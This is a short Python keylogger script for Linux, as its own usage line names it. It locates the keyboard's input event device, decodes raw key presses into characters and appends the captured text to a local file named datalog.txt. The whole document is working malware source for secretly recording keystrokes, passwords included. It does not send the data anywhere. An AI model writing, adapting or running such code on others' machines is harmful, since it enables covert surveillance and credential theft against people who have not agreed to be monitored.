#!/usr/bin/env python3
# -*-coding:Latin-1 -*

import sys
import re
import struct

qwerty_map = {
    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
    11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "q", 17: "w",
    18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "[",
    27: "]", 28: "\n", 29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
    35: "h", 36: "j", 37: "k", 38: "l", 39: ";", 40: "'", 41: "~", 42: "[SHIFT]",
    43: "BACKSLASH", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
    51: ",", 52: ".", 53: "/", 54: "[SHIFT]", 55: "*", 56: "ALT", 57: " ", 58: "[CAPSLOCK]",
}

BUF_SIZE = None

def main():
    with open("/proc/bus/input/devices") as f:
        lines = f.readlines()

        pattern = re.compile("Handlers|EV=")
        handlers = list(filter(pattern.search, lines))

        pattern = re.compile("EV=120013")
        for idx, elt in enumerate(handlers):
            if pattern.search(elt):
                line = handlers[idx - 1]
        pattern = re.compile("event[0-9]")
        infile_path = "/dev/input/" + pattern.search(line).group(0)

    FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(FORMAT)

    in_file = open(infile_path, "rb")

    event = in_file.read(EVENT_SIZE)
    typed = ""

    while event:
        (_, _, type, code, value) = struct.unpack(FORMAT, event)

        if code != 0 and type == 1 and value == 1:
            if code in qwerty_map:
                typed += qwerty_map[code]
        if len(typed) > BUF_SIZE:
            data = open("datalog.txt", "a")
            data.write(typed)
            data.close()

            typed = ""
        event = in_file.read(EVENT_SIZE)

    in_file.close()


def usage():
    print("Usage : ./keylogger [buffer_size]") # noqa


def init_arg():
    if len(sys.argv) < 1:
        usage()
        exit()
    global BUF_SIZE
    BUF_SIZE = int(sys.argv[1])


if __name__ == "__main__":
    init_arg()
    main()
